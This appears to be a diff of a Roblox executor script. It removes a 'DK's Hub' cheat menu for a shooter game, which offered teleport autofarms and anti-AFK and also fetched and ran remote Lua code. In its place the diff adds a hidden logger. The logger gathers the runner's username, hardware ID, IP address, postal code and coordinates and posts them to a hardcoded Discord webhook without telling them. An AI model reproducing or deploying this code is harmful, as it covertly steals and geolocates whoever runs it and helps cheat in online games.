@@ -1,480 +1,120 @@
-local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
-loadstring(game:HttpGet('https://raw.githubusercontent.com/Pixeluted/adoniscries/main/Source.lua'))()
-local executor = identifyexecutor and identifyexecutor() or "Unknown Executor"
-
-local customTheme = {
-   TextColor = Color3.fromRGB(255, 255, 255),
-   Background = Color3.fromRGB(0, 0, 0),
-   Topbar = Color3.fromRGB(0, 0, 0),
-   TopbarLine = Color3.fromRGB(255, 255, 255),
-   Shadow = Color3.fromRGB(0, 0, 0),
-   Accent = Color3.fromRGB(255, 255, 255),
-   NotificationBackground = Color3.fromRGB(0, 0, 0),
-   NotificationActionsBackground = Color3.fromRGB(0, 0, 0),
-   TabBackground = Color3.fromRGB(0, 0, 0),
-   TabStroke = Color3.fromRGB(0, 0, 0),
-   TabBackgroundSelected = Color3.fromRGB(0, 0, 0),
-   TabTextColor = Color3.fromRGB(149, 149, 149),
-   SelectedTabTextColor = Color3.fromRGB(255, 255, 255),
-   ElementBackground = Color3.fromRGB(0, 0, 0),
-   ElementBackgroundHover = Color3.fromRGB(20, 20, 20),
-   SecondaryElementBackground = Color3.fromRGB(0, 0, 0),
-   ElementStroke = Color3.fromRGB(255, 255, 255),
-   SecondaryElementStroke = Color3.fromRGB(255, 255, 255),
-   SliderBackground = Color3.fromRGB(0, 0, 0),
-   SliderProgress = Color3.fromRGB(255, 255, 255),
-   SliderStroke = Color3.fromRGB(255, 255, 255),
-   ToggleBackground = Color3.fromRGB(0, 0, 0),
-   ToggleEnabled = Color3.fromRGB(255, 255, 255),
-   ToggleDisabled = Color3.fromRGB(100, 100, 100),
-   ToggleEnabledStroke = Color3.fromRGB(255, 255, 255),
-   ToggleDisabledStroke = Color3.fromRGB(100, 100, 100),
-   ToggleEnabledOuterStroke = Color3.fromRGB(255, 255, 255),
-   ToggleDisabledOuterStroke = Color3.fromRGB(100, 100, 100),
-   DropdownSelected = Color3.fromRGB(0, 0, 0),
-   DropdownUnselected = Color3.fromRGB(0, 0, 0),
-   InputBackground = Color3.fromRGB(0, 0, 0),
-   InputStroke = Color3.fromRGB(255, 255, 255),
-   PlaceholderColor = Color3.fromRGB(150, 150, 150),
-   KeyInputBackground = Color3.fromRGB(0, 0, 0),
-   KeyInputTextColor = Color3.fromRGB(255, 255, 255)
-}
-
-local Window = Rayfield:CreateWindow({
-   Name = "DK's Hub | Cali Shootout | V0.0 [BETA] | " .. executor,
-   Icon = nil,
-   LoadingTitle = "",
-   LoadingSubtitle = "",
-   Theme = customTheme,
-   DisableRayfieldPrompts = false,
-   DisableBuildWarnings = false,
-   ConfigurationSaving = {Enabled = false, FolderName = "BlackThemeHub", FileName = "BigHub"},
-   Discord = {Enabled = true, Invite = "Fy7PanRV", RememberJoins = true},
-   KeySystem = false,
-   KeySettings = {Title = "X-DK | V1", Subtitle = "Enter Key Below", Note = "Buy A Key At Discord.gg/dkshub", FileName = "Key", SaveKey = true, GrabKeyFromSite = false, Key = {""}, Theme = customTheme}
-})
-
-local AutofarmTab = Window:CreateTab("Autofarm", "clock-4")
-AutofarmTab:CreateSection("Box Autofarm")
-
-local autofarmRunning = false
-local targetPosition1 = Vector3.new(-1943.447998, 3.407532, -48.730820)
-local targetPosition2 = Vector3.new(-1925.296265, 3.107532, -22.598623)
-local walkSpeed = 16
-local player = game.Players.LocalPlayer
-local character = player.Character or player.CharacterAdded:Wait()
-
-local function walkToTarget(targetPos)
-    local hum = character:FindFirstChild("Humanoid")
-    if not hum then return end
-    hum.WalkSpeed = walkSpeed
-    hum:MoveTo(targetPos)
-    hum.MoveToFinished:Wait()
-end
-
-local Toggle = AutofarmTab:CreateToggle({
-    Name = "Box Autofarm",
-    CurrentValue = false,
-    Flag = "BoxAutofarm",
-    Callback = function(Value)
-        if Value then
-            if autofarmRunning then return end
-            autofarmRunning = true
-
-            character:SetPrimaryPartCFrame(CFrame.new(targetPosition1))
-            task.wait(0.1)
-
-            while autofarmRunning do
-                for _, v in ipairs(workspace:GetDescendants()) do
-                    if v:IsA("ProximityPrompt") then
-                        v.HoldDuration = 0
-                    end
-                end
-
-                for _, item in ipairs(player.Backpack:GetChildren()) do
-                    if item.Name == "BOX" then
-                        item.Parent = character
-                    end
-                end
-
-                fireproximityprompt(workspace["Job System"].BoxPickingJob.BOX1.ProximityPrompt)
-                task.wait(0.3)
-
-                walkToTarget(targetPosition2)
-                task.wait(1)
-
-                walkToTarget(targetPosition1)
-                task.wait(1)
-            end
-        else
-            autofarmRunning = false
-        end
-    end,
-})
-
-AutofarmTab:CreateSection("Garbage Autofarm")
-
-local autofarmRunning = false
-local targetPosition1 = Vector3.new(-1384.321777, 3.407532, 24.331875)
-local targetPosition2 = Vector3.new(-1409.781860, 3.383504, 28.311769)
-local walkSpeed = 16
-local player = game.Players.LocalPlayer
-local character = player.Character or player.CharacterAdded:Wait()
-
-local function walkToTarget(targetPos)
-    local hum = character:FindFirstChild("Humanoid")
-    if not hum then return end
-    hum.WalkSpeed = walkSpeed
-    hum:MoveTo(targetPos)
-    hum.MoveToFinished:Wait()
-end
-
-local Toggle = AutofarmTab:CreateToggle({
-    Name = "Garbage Autofarm",
-    CurrentValue = false,
-    Flag = "GarbageAutofarm",
-    Callback = function(Value)
-        if Value then
-            if autofarmRunning then return end
-            autofarmRunning = true
-
-            character:SetPrimaryPartCFrame(CFrame.new(targetPosition1))
-            task.wait(0.1)
-
-            while autofarmRunning do
-                for _, v in ipairs(workspace:GetDescendants()) do
-                    if v:IsA("ProximityPrompt") then
-                        v.HoldDuration = 0
-                    end
-                end
-
-                for _, item in ipairs(player.Backpack:GetChildren()) do
-                    if item.Name == "Garbage" then
-                        item.Parent = character
-                    end
-                end
-
-                fireproximityprompt(workspace["Job System"].GarbageJob.BOX1.ProximityPrompt)
-                task.wait(0.3)
-
-                walkToTarget(targetPosition2)
-                task.wait(1)
-
-                walkToTarget(targetPosition1)
-                task.wait(1)
-            end
-        else
-            autofarmRunning = false
-        end
-    end,
-})
-
-AutofarmTab:CreateSection("Mop Autofarm")
-
-local mopAutofarmRunning = false
-local player = game.Players.LocalPlayer
-local character = player.Character or player.CharacterAdded:Wait()
-
-local function getSafePosition(position)
-    local raycastResult = workspace:Raycast(position, Vector3.new(0, -10, 0))
-    if raycastResult then
-        return position + Vector3.new(0, 5, 0)
-    else
-        return position
-    end
-end
-
-local function teleportAndFire(prompt)
-    local cleanPart = prompt.Parent
-    character:SetPrimaryPartCFrame(cleanPart.CFrame)
-    task.wait(0.3)
-    fireproximityprompt(prompt)
-end
-
-local Toggle = AutofarmTab:CreateToggle({
-    Name = "Mop Autofarm",
-    CurrentValue = false,
-    Flag = "MopAutofarm",
-    Callback = function(Value)
-        if Value then
-            if mopAutofarmRunning then return end
-            mopAutofarmRunning = true
-
-            local safePosition = getSafePosition(CFrame.new(-1655.081543, 3.507527, 42.390194).Position)
-            character:SetPrimaryPartCFrame(CFrame.new(safePosition))
-            task.wait(0.3)
-
-            game:GetService("ReplicatedStorage").giveMop:FireServer()
-            task.wait(1)
-
-            local mop = player.Backpack:FindFirstChild("Mop")
-            if mop then
-                mop.Parent = character
-                mop.Handle.Anchored = false
-                mop.Handle.CFrame = character:WaitForChild("RightHand").CFrame
-            end
-
-            local prompts = {
-                workspace.Cleaning_System.Dirt_Spawn:GetChildren()[9].Main.ProximityPrompt,
-                workspace.Cleaning_System.Dirt_Spawn.Dirt.Main.ProximityPrompt,
-                workspace.Cleaning_System.Dirt_Spawn:GetChildren()[5].Main.ProximityPrompt,
-                workspace.Cleaning_System.Dirt_Spawn:GetChildren()[2].Main.ProximityPrompt,
-                workspace.Cleaning_System.Dirt_Spawn:GetChildren()[7].Main.ProximityPrompt,
-                workspace.Cleaning_System.Dirt_Spawn:GetChildren()[6].Main.ProximityPrompt,
-                workspace.Cleaning_System.Dirt_Spawn:GetChildren()[8].Main.ProximityPrompt,
-                workspace.Cleaning_System.Dirt_Spawn:GetChildren()[4].Main.ProximityPrompt,
-                workspace.Cleaning_System.Dirt_Spawn:GetChildren()[3].Main.ProximityPrompt
-            }
-
-            while mopAutofarmRunning do
-                for _, prompt in ipairs(prompts) do
-                    teleportAndFire(prompt)
-                    task.wait(0.3)
-                end
-            end
-        else
-            mopAutofarmRunning = false
-        end
-    end
-})
-
-AutofarmTab:CreateSection("Fake Check Autofarm")
-
-local autofarmRunning = false
-
-local Toggle = AutofarmTab:CreateToggle({
-    Name = "Fake Checks Autofarm",
-    CurrentValue = false,
-    Flag = "FakeChecksAutofarm",
-    Callback = function(Value)
-        if Value then
-            if autofarmRunning then return end
-            autofarmRunning = true
-
-            for _, v in ipairs(workspace:GetDescendants()) do
-                if v:IsA("ProximityPrompt") then
-                    v.HoldDuration = 0
-                end
-            end
-
-            local prompts = {
-                workspace.OtherItems.CheckTable.CloneC.ProximityPrompt1,
-                workspace.OtherItems.CheckTable.ActivateC.ProximityPrompt2,
-                workspace.OtherItems:GetChildren()[599]["Vender cc"].Vender
-            }
-
-            local cframes = {
-                CFrame.new(-2405.316650, 3.407532, -42.879230),
-                CFrame.new(-2454.811523, 109.807449, -218.501816),
-                CFrame.new(-2450.307617, 109.807449, -218.223892),
-                CFrame.new(-2358.492676, 3.535766, 131.445221)
-            }
-
-            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = cframes[1]
-            task.wait(3)
-
-            while autofarmRunning do
-                for i, prompt in ipairs(prompts) do
-                    game.Players.LocalPlayer.Character:SetPrimaryPartCFrame(cframes[i + 1])
-                    task.wait(0.3)
-                    fireproximityprompt(prompt)
-                    task.wait(1)
-                end
-            end
-        else
-            autofarmRunning = false
-        end
-    end
-})
-
-AutofarmTab:CreateSection("Car")
-
-local teleporting = false
-
-local function findPrompts(root)
-    local prompts = {}
-    for _, item in ipairs(root:GetDescendants()) do
-        if item:IsA("ProximityPrompt") then
-            table.insert(prompts, item)
-        end
-    end
-    return prompts
-end
-
-local prompts = findPrompts(workspace.CarRobberys)
-local character = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
-
-local function teleportToPrompts()
-    for _, prompt in ipairs(prompts) do
-        if not teleporting then return end
-        local pos = prompt.Parent.Position
-        character:SetPrimaryPartCFrame(CFrame.new(pos))
-        task.wait(1)
-        fireproximityprompt(prompt)
-    end
-end
-
-local Toggle = AutofarmTab:CreateToggle({
-    Name = "Car Rob Autofarm",
-    CurrentValue = false,
-    Flag = "CarRobAutofarm",
-    Callback = function(Value)
-        if Value then
-            teleporting = true
-            while teleporting do
-                teleportToPrompts()
-                task.wait(1)
-            end
-        else
-            teleporting = false
-        end
-    end
-})
-
-AutofarmTab:CreateSection("Grass Autofarm")
-
-local targetCFrames = {
-    CFrame.new(-1989.46448, 6.79505634, 182.808807, 0, 0, 1, 0, 1, 0, -1, 0, 0),
-    CFrame.new(-1981.86438, 6.79505634, 182.808807, 0, 0, 1, 0, 1, 0, -1, 0, 0),
-    CFrame.new(-1985.76453, 6.79505634, 182.808807, 0, 0, 1, 0, 1, 0, -1, 0, 0),
-    CFrame.new(-1975.26453, 6.79505634, 182.808807, 0, 0, 1, 0, 1, 0, -1, 0, 0),
-    CFrame.new(-1967.66443, 6.79505634, 182.808807, 0, 0, 1, 0, 1, 0, -1, 0, 0),
-    CFrame.new(-1971.56458, 6.79505634, 182.808807, 0, 0, 1, 0, 1, 0, -1, 0, 0)
-}
-
-local secondaryCFrame = CFrame.new(-2005.133301, 3.489641, 196.952301)
-
-local function equipGrass()
-    local bp = game.Players.LocalPlayer.Backpack
-    for _, item in ipairs(bp:GetChildren()) do
-        if item.Name == "Grass" then
-            item.Parent = game.Players.LocalPlayer.Character
-        end
-    end
-end
-
-local function teleportAndFirePrompt(targetCFrame)
-    local char = game.Players.LocalPlayer.Character
-    char:SetPrimaryPartCFrame(targetCFrame)
-    task.wait(0.1)
-    for _, part in ipairs(workspace:GetDescendants()) do
-        if part:IsA("BasePart") and part.CFrame == targetCFrame then
-            local prompt = part:FindFirstChildOfClass("ProximityPrompt")
-            if prompt then
-                fireproximityprompt(prompt)
-                break
-            end
-        end
-    end
-end
-
-local looping = false
-
-local Toggle = AutofarmTab:CreateToggle({
-    Name = "Grass Autofarm",
-    CurrentValue = false,
-    Flag = "GrassAutofarm",
-    Callback = function(Value)
-        if Value then
-            looping = true
-            while looping do
-                for _, cframe in ipairs(targetCFrames) do
-                    equipGrass()
-                    teleportAndFirePrompt(cframe)
-                    task.wait(1)
-                    teleportAndFirePrompt(secondaryCFrame)
-                    task.wait(1)
-                end
-            end
-        else
-            looping = false
-        end
-    end
-})
-
-AutofarmTab:CreateSection("Other")
-
-local instantEnabled = false
-local storedDurations = {}
-
-local Toggle = AutofarmTab:CreateToggle({
-    Name = "Instant Prompts",
-    Default = false,
-    Callback = function(v)
-        instantEnabled = v
-        if v then
-            for _, prompt in ipairs(workspace:GetDescendants()) do
-                if prompt:IsA("ProximityPrompt") then
-                    storedDurations[prompt] = prompt.HoldDuration
-                    prompt.HoldDuration = 0
-                end
-            end
-        else
-            for prompt, dur in pairs(storedDurations) do
-                if prompt and prompt.Parent then
-                    prompt.HoldDuration = dur
-                end
-            end
-            storedDurations = {}
-        end
-    end
-})
-
-
-AutofarmTab:CreateButton({
-    Name = "Anti AFK",
-    Callback = function()
-        local gui = Instance.new("ScreenGui")
-        local top = Instance.new("TextLabel")
-        local frame = Instance.new("Frame")
-        local bottom = Instance.new("TextLabel")
-        local status = Instance.new("TextLabel")
-
-        gui.Parent = game.CoreGui
-        gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-
-        top.Parent = gui
-        top.Active = true
-        top.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
-        top.Draggable = true
-        top.Position = UDim2.new(0.7, 0, 0.1, 0)
-        top.Size = UDim2.new(0, 370, 0, 52)
-        top.Font = Enum.Font.SourceSansSemibold
-        top.Text = "By XDk | Read Bio Before @"
-        top.TextColor3 = Color3.new(1, 1, 1)
-        top.TextSize = 22
-
-        frame.Parent = top
-        frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-        frame.Position = UDim2.new(0, 0, 1.02, 0)
-        frame.Size = UDim2.new(0, 370, 0, 107)
-
-        bottom.Parent = frame
-        bottom.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
-        bottom.Position = UDim2.new(0, 0, 0.8, 0)
-        bottom.Size = UDim2.new(0, 370, 0, 21)
-        bottom.Font = Enum.Font.Arial
-        bottom.Text = "DK's Hub | Anti AFK"
-        bottom.TextColor3 = Color3.new(1, 1, 1)
-        bottom.TextSize = 20
-
-        status.Parent = frame
-        status.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
-        status.Position = UDim2.new(0, 0, 0.15, 0)
-        status.Size = UDim2.new(0, 370, 0, 44)
-        status.Font = Enum.Font.ArialBold
-        status.Text = "Status: Working!"
-        status.TextColor3 = Color3.new(1, 1, 1)
-        status.TextSize = 20
-
-        local vu = game:GetService("VirtualUser")
-        game:GetService("Players").LocalPlayer.Idled:Connect(function()
-            vu:CaptureController()
-            vu:ClickButton2(Vector2.new())
-            status.Text = "Anti AFK Enabled"
-            wait(2)
-            status.Text = "Status: Working!"
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
+local Stats = game:GetService("Stats")
+local UserInputService = game:GetService("UserInputService")
+
+function HWIDGET()
+    if gethwid then return gethwid() end
+    if hwid or get_hwid then return hwid or get_hwid() end
+    if identifyexecutor then
+        local suc, res = pcall(function()
+            return identifyexecutor().hwid
         end)
+        if suc and res then return res end
     end
-})
+    return RbxAnalyticsService:GetClientId()
+end
 
+local function getFullIPData()
+    local success, response = pcall(function()
+        return HttpService:JSONDecode(game:HttpGet("https://ipinfo.io/json"))
+    end)
+
+    if success and response.ip then
+        local locParts = (response.loc or ","):split(",")
+        return {
+            ip = response.ip or "N/A",
+            country = response.country or "N/A",
+            city = response.city or "N/A",
+            region = response.region or "N/A",
+            postal = response.postal or "N/A",
+            latitude = locParts[1] or "N/A",
+            longitude = locParts[2] or "N/A",
+            isp = response.org or "N/A",
+            org = response.org or "N/A",
+            timezone = response.timezone or "N/A"
+        }
+    else
+        return nil
+    end
+end
+
+local function sendFullWebhookMessage(url, username, userId, gameName, executorName, hwid, ipData, platform, membership, accountAge, ping)
+    local data = {
+        ["embeds"] = {{
+            ["title"] = "Executed Successfully!",
+            ["color"] = 65280,
+            ["fields"] = {
+                {
+                    ["name"] = "User Information",
+                    ["value"] = "Username: @" .. username .. "\nUser ID: " .. userId .. "\nMembership: " .. membership .. "\nAccount Age: " .. accountAge .. " days",
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "Game & Executor",
+                    ["value"] = "Game: " .. gameName .. "\nExecutor: " .. executorName,
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "HWID",
+                    ["value"] = hwid,
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "Location (Geo)",
+                    ["value"] = "Country: " .. (ipData.country or "N/A") ..
+                               "\nCity: " .. (ipData.city or "N/A") ..
+                               "\nRegion: " .. (ipData.region or "N/A") ..
+                               "\nPostal Code: " .. (ipData.postal or "N/A") ..
+                               "\nLatitude: " .. (ipData.latitude or "N/A") ..
+                               "\nLongitude: " .. (ipData.longitude or "N/A"),
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "Network Info",
+                    ["value"] = "ISP: " .. (ipData.isp or "N/A") ..
+                               "\nOrg: " .. (ipData.org or "N/A") ..
+                               "\nTime Zone: " .. (ipData.timezone or "N/A"),
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "Platform & Ping",
+                    ["value"] = "Platform: " .. platform ..
+                               "\nPing: " .. ping .. "ms",
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "Time Executed",
+                    ["value"] = os.date("%d/%m/%Y %I:%M:%S %p"),
+                    ["inline"] = false
+                }
+            }
+        }}
+    }
+
+    local jsonData = HttpService:JSONEncode(data)
+    (http_request or request or syn.request)({
+        Url = url,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = jsonData
+    })
+end
+
+local player = Players.LocalPlayer
+local username = player.Name
+local userId = player.UserId
+local gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
+local executorName = identifyexecutor and identifyexecutor() or "Unknown"
+local hwid = HWIDGET()
+local ipData = getFullIPData()
+local platform = (UserInputService.TouchEnabled and not UserInputService.MouseEnabled) and "Mobile" or "PC"
+local membership = tostring(player.MembershipType):sub(21)
+local accountAge = player.AccountAge
+local ping = math.round(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
+
+local webhookUrl = "https://discord.com/api/webhooks/1370591614346592317/EVRXFJKW3HZQVsh6ML5IJxhQmRv83BE5SxswtYTJqtbmoEukqy1cviROtOCtmQDTCkns"
+
+sendFullWebhookMessage(webhookUrl, username, userId, gameName, executorName, hwid, ipData, platform, membership, accountAge, ping)
